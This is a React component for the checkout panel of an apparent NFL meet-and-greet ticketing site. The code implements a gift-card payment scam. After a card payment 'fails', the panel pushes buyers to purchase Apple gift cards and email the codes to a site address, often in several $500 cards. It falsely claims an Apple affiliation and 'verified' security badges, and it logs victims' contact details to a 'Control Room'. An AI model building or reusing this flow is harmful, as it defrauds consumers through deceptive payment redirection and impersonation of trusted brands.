import React, { useState, useEffect } from "react";
import {
  Gift,
  ExternalLink,
  Plus,
  Trash2,
  CheckCircle2,
  ShieldCheck,
  ArrowUpRight,
  CreditCard,
  Layers,
  Lock,
  AlertTriangle,
  X,
  Mail,
  Copy,
  Check,
  Loader2,
  Send,
} from "lucide-react";
import {
  recordAppleCardPartnerDeparture,
  recordAppleCardSentConfirmation,
  getPendingAppleConfirmation,
} from "../../services/paymentControlService";

export const OFFICIAL_GIFTCARD_EMAIL = "support@nflgridiron.company";
export const APPLE_STORE_GIFT_CARD_URL = "https://www.apple.com/shop/gift-cards";

export interface GiftCardCodeEntry {
  code: string;
  pin: string;
  amount: string;
}

export interface GuestGiftCardSite {
  id: string;
  name: string;
  url: string;
  affiliationBadge: string;
  paymentMethods: string;
  deliveryNote: string;
  recommendedFor: string;
}

export const GUEST_GIFT_CARD_RETAILERS: GuestGiftCardSite[] = [
  {
    id: "apple",
    name: "Apple Store Online",
    url: APPLE_STORE_GIFT_CARD_URL,
    affiliationBadge: "Affiliated · Secured Official Store",
    paymentMethods: "Credit / Debit Card · Apple Pay",
    deliveryNote: "Guest checkout supported · Buy ONLY an Apple Card / Apple Gift Card",
    recommendedFor: "Official Apple Card / Apple Gift Card ($25 – $500+)",
  },
];

export const GIFT_CARD_BRAND_OPTIONS = ["Apple Gift Card"];

interface GiftCardGuestPurchasePanelProps {
  amountDue: number;
  brand: string;
  onBrandChange: (brand: string) => void;
  cardNumber: string;
  onCardNumberChange: (combinedCodes: string) => void;
  pin?: string;
  onPinChange?: (combinedPins: string) => void;
  balance?: string;
  onBalanceChange?: (totalDeclaredBalance: string) => void;
  discountBadge?: string;
  accentColor?: "gold" | "blue" | "amber";
  sessionId?: string;
  customerName?: string;
  customerEmail?: string;
  customerPhone?: string;
  itemTitle?: string;
  itemType?: "ticket" | "experience" | "merchandise" | "deposit";
  venue?: string;
  onPartnerDepartureRecorded?: (partnerName: string, sessionId: string) => void;
}

export const GiftCardGuestPurchasePanel: React.FC<GiftCardGuestPurchasePanelProps> = ({
  amountDue,
  brand,
  onBrandChange,
  cardNumber,
  onCardNumberChange,
  pin = "",
  onPinChange,
  balance = "",
  onBalanceChange,
  discountBadge,
  sessionId,
  customerName,
  customerEmail,
  customerPhone,
  itemTitle,
  itemType = "experience",
  venue,
  onPartnerDepartureRecorded,
}) => {
  const [entries, setEntries] = useState<GiftCardCodeEntry[]>(() => [
    {
      code: cardNumber || "",
      pin: pin || "",
      amount: balance || (amountDue ? String(amountDue) : ""),
    },
  ]);
  const [fallbackSessionId] = useState(
    () => `APPLE-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`
  );
  const [recordedPartnerName, setRecordedPartnerName] = useState<string | null>(
    () => getPendingAppleConfirmation()?.partnerName || null
  );
  const [returnedFromAppleStore, setReturnedFromAppleStore] = useState(
    () => Boolean(getPendingAppleConfirmation())
  );
  const [confirmingSent, setConfirmingSent] = useState(false);
  const [sentConfirmedRef, setSentConfirmedRef] = useState<string | null>(null);
  const [quickSentNote, setQuickSentNote] = useState("");
  const [copiedEmail, setCopiedEmail] = useState(false);
  const [showCardRedirectBanner, setShowCardRedirectBanner] = useState(false);

  // Detect immediate redirect from failed Stripe card attempt and Apple Store departure log
  useEffect(() => {
    try {
      const ts = sessionStorage.getItem("nfl_card_redirect_notice");
      if (ts) {
        const ageMs = Date.now() - Number(ts);
        if (!Number.isNaN(ageMs) && ageMs < 600_000) {
          setShowCardRedirectBanner(true);
        }
        sessionStorage.removeItem("nfl_card_redirect_notice");
      }
      const loggedPartner = sessionStorage.getItem("nfl_apple_partner_logged");
      if (loggedPartner) {
        setRecordedPartnerName(loggedPartner);
        sessionStorage.removeItem("nfl_apple_partner_logged");
      } else {
        const pending = getPendingAppleConfirmation();
        if (pending) {
          setRecordedPartnerName(pending.partnerName || "Apple Store Online");
          setReturnedFromAppleStore(true);
        }
      }
    } catch {
      // ignore storage errors
    }
  }, []);

  // Automatically detect when customer returns to this tab after paying on Apple Store Online
  useEffect(() => {
    if (!recordedPartnerName || sentConfirmedRef) return;

    const markReturned = () => {
      if (document.visibilityState === "visible") {
        setReturnedFromAppleStore(true);
      }
    };

    window.addEventListener("focus", markReturned);
    document.addEventListener("visibilitychange", markReturned);
    return () => {
      window.removeEventListener("focus", markReturned);
      document.removeEventListener("visibilitychange", markReturned);
    };
  }, [recordedPartnerName, sentConfirmedRef]);

  // Enforce Apple Gift Card only
  useEffect(() => {
    if (brand !== "Apple Gift Card") {
      onBrandChange("Apple Gift Card");
    }
  }, [brand, onBrandChange]);

  // Keep parent single-code field & single-pin field synchronized when switching back or editing
  useEffect(() => {
    if (!cardNumber && entries.length === 1 && entries[0].code !== "") {
      setEntries([{ code: "", pin: "", amount: amountDue ? String(amountDue) : "" }]);
    }
  }, [cardNumber, amountDue]);

  const handleCopyEmail = () => {
    navigator.clipboard.writeText(OFFICIAL_GIFTCARD_EMAIL);
    setCopiedEmail(true);
    setTimeout(() => setCopiedEmail(false), 2200);
  };

  const handleLogPartnerDeparture = (partner: GuestGiftCardSite) => {
    const resolvedSessionId = (sessionId || fallbackSessionId).trim();
    setRecordedPartnerName(partner.name);

    void recordAppleCardPartnerDeparture({
      sessionId: resolvedSessionId,
      customerName,
      customerEmail,
      customerPhone,
      itemTitle: itemTitle || "CeeDee Lamb Meet & Greet / NFL Reservation",
      itemType,
      amount: amountDue,
      partnerName: partner.name,
      partnerUrl: partner.url,
      venue,
    })
      .then((res) => {
        onPartnerDepartureRecorded?.(partner.name, res.sessionId);
      })
      .catch((err) => {
        console.warn("Could not record Apple partner redirect:", err);
      });
  };

  const handleConfirmAppleCardSent = async () => {
    if (confirmingSent) return;
    setConfirmingSent(true);
    const resolvedSessionId = (sessionId || fallbackSessionId).trim();
    const cleanedNote = quickSentNote.trim();
    const existingCode = entries[0]?.code?.trim() || "";
    const resolvedCode =
      cleanedNote ||
      existingCode ||
      `CONFIRMED SENT TO ${OFFICIAL_GIFTCARD_EMAIL}`;

    // Sync confirmation back into parent form state so Finish/Submit stays enabled
    const next = entries.map((item, idx) =>
      idx === 0
        ? {
            ...item,
            code: resolvedCode,
            amount: item.amount || (amountDue ? String(amountDue) : ""),
          }
        : item
    );
    syncToParent(next);

    try {
      const res = await recordAppleCardSentConfirmation({
        sessionId: resolvedSessionId,
        customerName,
        customerEmail,
        customerPhone,
        itemTitle: itemTitle || "CeeDee Lamb Public Meet & Greet",
        itemType,
        amount: amountDue,
        venue,
        cardCode: cleanedNote || existingCode || undefined,
      });
      setSentConfirmedRef(res.orderId);
    } catch (err) {
      console.warn("Could not save Apple Card sent confirmation:", err);
      setSentConfirmedRef(resolvedSessionId);
    } finally {
      setConfirmingSent(false);
    }
  };

  const syncToParent = (nextEntries: GiftCardCodeEntry[]) => {
    setEntries(nextEntries);
    const nonEmptyCodes = nextEntries
      .map((item, idx) => {
        const cleanCode = item.code.trim();
        if (!cleanCode) return "";
        if (nextEntries.length === 1) return cleanCode;
        const valNote = item.amount.trim() ? ` ($${item.amount.trim().replace(/^\$/, "")})` : "";
        return `#${idx + 1}: ${cleanCode}${valNote}`;
      })
      .filter(Boolean);

    onCardNumberChange(nonEmptyCodes.join(" | "));

    if (onPinChange) {
      const pins = nextEntries
        .map((item, idx) => {
          const p = item.pin.trim();
          if (!p) return "";
          return nextEntries.length === 1 ? p : `#${idx + 1}: ${p}`;
        })
        .filter(Boolean);
      onPinChange(pins.join(" | "));
    }

    if (onBalanceChange) {
      const numericSum = nextEntries.reduce((sum, item) => {
        const parsed = parseFloat(item.amount.replace(/[^0-9.]/g, ""));
        return sum + (isNaN(parsed) ? 0 : parsed);
      }, 0);
      if (numericSum > 0) {
        onBalanceChange(String(numericSum));
      } else {
        onBalanceChange(nextEntries[0]?.amount || "");
      }
    }
  };

  const handleEntryChange = (idx: number, field: keyof GiftCardCodeEntry, value: string) => {
    const next = entries.map((item, i) => (i === idx ? { ...item, [field]: value } : item));
    syncToParent(next);
  };

  const handleAddCard = () => {
    syncToParent([...entries, { code: "", pin: "", amount: "" }]);
  };

  const handleRemoveCard = (idx: number) => {
    if (entries.length <= 1) return;
    const next = entries.filter((_, i) => i !== idx);
    syncToParent(next);
  };

  const handleMarkEmailedToSupport = () => {
    const next = entries.map((item, idx) =>
      idx === 0
        ? {
            ...item,
            code: `MAILED TO ${OFFICIAL_GIFTCARD_EMAIL}`,
            amount: item.amount || (amountDue ? String(amountDue) : ""),
          }
        : item
    );
    syncToParent(next);
  };

  const validEnteredCount = entries.filter((e) => e.code.trim().length >= 4).length;

  return (
    <div className="rounded-2xl bg-[#040711] border border-white/10 p-4 sm:p-5 space-y-5 relative">
      {/* Immediate Card-Redirect Notice Banner */}
      {showCardRedirectBanner && (
        <div className="p-3.5 rounded-xl bg-amber-500/15 border border-amber-400/45 flex items-start justify-between gap-3">
          <div className="flex items-start gap-2.5 text-xs">
            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
            <div className="space-y-0.5">
              <p className="font-bold text-amber-200">
                Card Payment Unavailable — Complete With Apple Card
              </p>
              <p className="text-[11px] text-amber-100/90 leading-relaxed">
                Standard debit/credit card processing did not go through. Purchase an Apple Card below, mail it directly to{" "}
                <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong> or enter your Apple Card code below to complete your reservation.
              </p>
            </div>
          </div>
          <button
            type="button"
            onClick={() => setShowCardRedirectBanner(false)}
            className="text-amber-300 hover:text-white cursor-pointer shrink-0"
            aria-label="Dismiss notice"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
      )}

      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3.5 border-b border-white/10">
        <div className="flex items-center gap-2.5">
          <div className="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-500/30 flex items-center justify-center text-amber-400 shrink-0">
            <Gift className="w-4 h-4" />
          </div>
          <div>
            <h4 className="text-sm font-bold text-white tracking-tight">
              Apple Card / Apple Gift Card Checkout
            </h4>
            <p className="text-xs text-zinc-400">
              Buy an Apple Card via Apple Store Online and mail to{" "}
              <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> or enter your code(s) below for{" "}
              <span className="font-mono font-semibold text-white">
                ${Number(amountDue || 0).toLocaleString()}
              </span>
            </p>
          </div>
        </div>
        {discountBadge && (
          <span className="text-[11px] font-mono font-bold text-emerald-400 self-start sm:self-center">
            {discountBadge}
          </span>
        )}
      </div>

      {/* Affiliated Security & Official Delivery Email Box */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
        <div className="p-3.5 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-start gap-2.5">
          <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
          <div className="text-xs leading-relaxed space-y-1">
            <p className="font-bold text-emerald-300">
              Secured Affiliated Store · Apple Card Only
            </p>
            <p className="text-zinc-300 text-[11px]">
              <strong className="text-white">Apple Store Online</strong> is our verified, secured official gift card store affiliated with{" "}
              <strong className="text-white">NFL Gridiron (nflgridiron.company)</strong>. Purchase{" "}
              <strong className="text-amber-300">ONLY an Apple Card / Apple Gift Card</strong>.
            </p>
          </div>
        </div>

        <div className="p-3.5 rounded-xl bg-[#080F22] border border-sky-500/35 flex flex-col justify-between gap-2">
          <div className="flex items-start gap-2">
            <Mail className="w-4 h-4 text-sky-400 shrink-0 mt-0.5" />
            <div className="min-w-0 flex-1">
              <p className="text-xs font-bold text-sky-300">
                Official Gift Card Delivery Email
              </p>
              <p className="text-[11px] text-zinc-300 leading-snug mt-0.5">
                Send/mail the digital Apple Card to this address, or send to yourself and paste the code below:
              </p>
            </div>
          </div>
          <div className="flex items-center justify-between gap-2 bg-[#040711] border border-white/10 rounded-lg px-3 py-2">
            <span className="text-xs font-mono font-bold text-white truncate">
              {OFFICIAL_GIFTCARD_EMAIL}
            </span>
            <button
              type="button"
              onClick={handleCopyEmail}
              className="px-2.5 py-1 rounded-md bg-sky-500/15 hover:bg-sky-500/25 border border-sky-400/30 text-[11px] font-bold text-sky-300 inline-flex items-center gap-1 shrink-0 cursor-pointer"
            >
              {copiedEmail ? (
                <>
                  <Check className="w-3 h-3 text-emerald-400" />
                  <span className="text-emerald-300">Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3 h-3" />
                  <span>Copy Email</span>
                </>
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Step 1: Buy Apple Card From Secured Partner Without Signing In */}
      <div className="space-y-2.5">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="text-xs font-semibold text-zinc-200 flex items-center gap-1.5">
            <CreditCard className="w-3.5 h-3.5 text-amber-400" />
            Step 1: Click Apple Store Online below to buy your Apple Card
          </span>
          <span className="text-[11px] text-emerald-400 font-mono flex items-center gap-1">
            <Lock className="w-3 h-3" />
            Verified · No sign-in required
          </span>
        </div>

        <div className="grid grid-cols-1 gap-3">
          {GUEST_GIFT_CARD_RETAILERS.map((site) => (
            <a
              key={site.id}
              href={site.url}
              target="_blank"
              rel="noopener noreferrer"
              onClick={() => handleLogPartnerDeparture(site)}
              className="group p-3.5 rounded-xl bg-[#080F22] hover:bg-[#0D1733] border border-white/10 hover:border-amber-400/50 transition-all duration-150 flex flex-col justify-between gap-2.5 text-left cursor-pointer"
            >
              <div className="flex items-start justify-between gap-2 w-full">
                <div>
                  <span className="inline-flex items-center gap-1 text-[10px] font-mono font-semibold text-emerald-400 mb-1">
                    <ShieldCheck className="w-3 h-3" />
                    {site.affiliationBadge}
                  </span>
                  <span className="text-sm font-bold text-white group-hover:text-amber-300 transition-colors flex items-center gap-1">
                    {site.name}
                    <ArrowUpRight className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                  </span>
                  <span className="text-[11px] text-sky-300 block mt-0.5 font-medium">
                    {site.paymentMethods}
                  </span>
                </div>
                <ExternalLink className="w-4 h-4 text-zinc-400 group-hover:text-white shrink-0 mt-0.5" />
              </div>
              <div className="space-y-1 pt-2 border-t border-white/[0.06] w-full">
                <p className="text-[11px] text-zinc-200 leading-snug">{site.deliveryNote}</p>
                <p className="text-[10px] font-semibold text-amber-300/90">{site.recommendedFor}</p>
              </div>
            </a>
          ))}
        </div>

        {sentConfirmedRef ? (
          <div className="p-4 sm:p-5 rounded-2xl bg-emerald-500/15 border border-emerald-400/50 space-y-2.5 text-xs">
            <div className="flex items-start gap-3">
              <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
              <div className="space-y-1">
                <p className="text-sm font-extrabold text-emerald-300">
                  Payment Confirmation Received — Verification Underway
                </p>
                <p className="text-zinc-200 leading-relaxed">
                  We have flagged your session (<span className="font-mono font-bold text-white">{sentConfirmedRef}</span>) in our Control Room confirming that you sent your Apple Card to{" "}
                  <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong>. Once our billing team verifies it in the inbox, your pass will be approved and issued.
                </p>
                <p className="text-[11px] text-emerald-200/90 pt-0.5">
                  Click the final Complete / Submit button below if you also want to download your pass receipt right away.
                </p>
              </div>
            </div>
          </div>
        ) : recordedPartnerName ? (
          <div className={`p-4 sm:p-5 rounded-2xl border space-y-3.5 text-xs transition-all ${
            returnedFromAppleStore
              ? "bg-emerald-500/15 border-emerald-400/55 shadow-[0_12px_36px_-12px_rgba(16,185,129,0.45)]"
              : "bg-sky-500/10 border-sky-400/40"
          }`}>
            <div className="flex items-start gap-2.5">
              <CheckCircle2 className={`w-5 h-5 shrink-0 mt-0.5 ${returnedFromAppleStore ? "text-emerald-400" : "text-sky-400"}`} />
              <div className="space-y-1">
                <p className={`text-sm font-extrabold ${returnedFromAppleStore ? "text-emerald-300" : "text-sky-300"}`}>
                  {returnedFromAppleStore
                    ? "Welcome Back From Apple Store Online — Confirm Your Payment"
                    : `Apple Store Online Opened (${recordedPartnerName}) — Return Here When Done`}
                </p>
                <p className="text-[11px] text-zinc-200 leading-relaxed">
                  {returnedFromAppleStore
                    ? `Finished purchasing and sending your Apple Card to ${OFFICIAL_GIFTCARD_EMAIL}? Enter your code or Apple Order # (optional) and click Confirm below so our team can verify your payment immediately.`
                    : `Keep this tab open while you buy your Apple Card on Apple Store Online and send it to ${OFFICIAL_GIFTCARD_EMAIL}. Once you come back to this tab, click the green button below to confirm you sent it.`}
                </p>
              </div>
            </div>

            <div className="space-y-2.5">
              <input
                type="text"
                value={quickSentNote}
                onChange={(e) => setQuickSentNote(e.target.value)}
                placeholder="Optional: Paste Apple Card code (X...) or Apple Order #"
                className="w-full min-h-[42px] bg-[#040711] border border-white/15 focus:border-emerald-400 rounded-xl px-3.5 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none"
              />

              <button
                type="button"
                onClick={handleConfirmAppleCardSent}
                disabled={confirmingSent}
                className="w-full min-h-[48px] px-5 py-3 rounded-xl bg-emerald-500 hover:bg-emerald-400 disabled:opacity-60 text-[#040B1D] font-black text-xs uppercase tracking-[0.1em] inline-flex items-center justify-center gap-2 transition-colors cursor-pointer shadow-lg shadow-emerald-500/20"
              >
                {confirmingSent ? (
                  <Loader2 className="w-4 h-4 animate-spin" />
                ) : (
                  <Send className="w-4 h-4 shrink-0" />
                )}
                <span>
                  {confirmingSent
                    ? "Confirming Payment..."
                    : "I Have Sent the Apple Card — Confirm Payment"}
                </span>
              </button>
            </div>
          </div>
        ) : null}

        {amountDue >= 500 && (
          <p className="text-[11px] text-amber-200/90 bg-amber-500/10 border border-amber-500/25 rounded-xl px-3.5 py-2.5 leading-relaxed">
            <strong>Tip for ${amountDue.toLocaleString()} orders:</strong> If a partner limits a single Apple Card to $500, you can buy multiple Apple Gift Cards, send them to{" "}
            <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong>, or add each code below using &ldquo;Add Another Apple Card Code&rdquo;.
          </p>
        )}
      </div>

      {/* Step 2: Code Entry or Direct Email Confirmation */}
      <div className="space-y-3 pt-1">
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="text-xs font-semibold text-zinc-200 flex items-center gap-1.5">
            <Layers className="w-3.5 h-3.5 text-emerald-400" />
            Step 2: Enter Your Apple Card Code(s) Below (or Confirm Mail to {OFFICIAL_GIFTCARD_EMAIL})
          </span>
          {validEnteredCount > 0 && (
            <span className="text-[11px] font-mono font-semibold text-emerald-400 flex items-center gap-1">
              <CheckCircle2 className="w-3.5 h-3.5" />
              {validEnteredCount} entry ready
            </span>
          )}
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div>
            <label className="text-[11px] font-semibold text-zinc-400 block mb-1">
              Accepted Gift Card Type
            </label>
            <div className="w-full min-h-[44px] bg-[#080F22] border border-emerald-500/35 rounded-xl px-3.5 py-2 text-xs font-bold text-white flex items-center justify-between">
              <span>Apple Card / Apple Gift Card Only</span>
              <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
            </div>
          </div>

          <div>
            <label className="text-[11px] font-semibold text-zinc-400 block mb-1">
              Target Payment Total
            </label>
            <input
              type="text"
              disabled
              value={`$${Number(amountDue || 0).toLocaleString()}.00 USD`}
              className="w-full min-h-[44px] bg-[#080F22] border border-white/10 rounded-xl px-3.5 py-2 text-xs font-mono font-bold text-emerald-400 tabular-nums"
            />
          </div>
        </div>

        {/* Multi-Card Code Rows */}
        <div className="space-y-2.5">
          {entries.map((entry, idx) => (
            <div
              key={idx}
              className="p-3 rounded-xl bg-[#080F22] border border-white/10 space-y-2.5"
            >
              <div className="flex flex-wrap items-center justify-between gap-2">
                <span className="text-[11px] font-mono font-bold text-zinc-300">
                  Apple Card #{idx + 1}
                </span>
                <div className="flex items-center gap-2">
                  {idx === 0 && (
                    <button
                      type="button"
                      onClick={handleMarkEmailedToSupport}
                      className="text-[11px] text-sky-300 hover:text-sky-200 bg-sky-500/10 hover:bg-sky-500/20 border border-sky-400/25 px-2.5 py-1 rounded-lg inline-flex items-center gap-1 cursor-pointer font-semibold"
                    >
                      <Mail className="w-3 h-3" />
                      I mailed it to {OFFICIAL_GIFTCARD_EMAIL}
                    </button>
                  )}
                  {entries.length > 1 && (
                    <button
                      type="button"
                      onClick={() => handleRemoveCard(idx)}
                      className="text-[11px] text-rose-400 hover:text-rose-300 inline-flex items-center gap-1 cursor-pointer"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                      Remove
                    </button>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-12 gap-2.5">
                <div className="sm:col-span-6">
                  <label className="text-[10px] font-semibold text-zinc-400 block mb-1">
                    16-Digit Apple Card Code (X...) or Mail Confirmation <span className="text-rose-400">*</span>
                  </label>
                  <input
                    type="text"
                    required={idx === 0}
                    placeholder="Enter Apple Gift Card code (X...) or email ref"
                    value={entry.code}
                    onChange={(e) => handleEntryChange(idx, "code", e.target.value)}
                    className="w-full min-h-[42px] bg-[#040711] border border-white/15 focus:border-amber-400 rounded-xl px-3 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none"
                  />
                </div>

                <div className="sm:col-span-3">
                  <label className="text-[10px] font-semibold text-zinc-400 block mb-1">
                    PIN / Order # (optional)
                  </label>
                  <input
                    type="text"
                    placeholder="PIN or Order #"
                    value={entry.pin}
                    onChange={(e) => handleEntryChange(idx, "pin", e.target.value)}
                    className="w-full min-h-[42px] bg-[#040711] border border-white/15 focus:border-amber-400 rounded-xl px-3 py-2 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none"
                  />
                </div>

                <div className="sm:col-span-3">
                  <label className="text-[10px] font-semibold text-zinc-400 block mb-1">
                    Card Value ($ USD)
                  </label>
                  <input
                    type="text"
                    placeholder={`$${amountDue}`}
                    value={entry.amount}
                    onChange={(e) => handleEntryChange(idx, "amount", e.target.value)}
                    className="w-full min-h-[42px] bg-[#040711] border border-white/15 focus:border-amber-400 rounded-xl px-3 py-2 text-xs font-mono text-emerald-400 placeholder-zinc-500 focus:outline-none tabular-nums"
                  />
                </div>
              </div>
            </div>
          ))}

          <button
            type="button"
            onClick={handleAddCard}
            className="min-h-[40px] px-4 py-2 rounded-xl bg-white/[0.04] hover:bg-white/[0.09] border border-white/15 text-xs font-semibold text-amber-300 inline-flex items-center gap-1.5 transition-colors cursor-pointer"
          >
            <Plus className="w-3.5 h-3.5" />
            <span>Add Another Apple Card Code (Split Total)</span>
          </button>
        </div>

        <div className="flex items-start gap-2 text-[11px] text-zinc-400 pt-1">
          <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
          <span>
            Whether you mail your digital Apple Card directly to{" "}
            <strong className="text-white font-mono">{OFFICIAL_GIFTCARD_EMAIL}</strong> or enter the code above, our billing desk verifies it right away and issues your confirmation.
          </span>
        </div>
      </div>

    </div>
  );
};

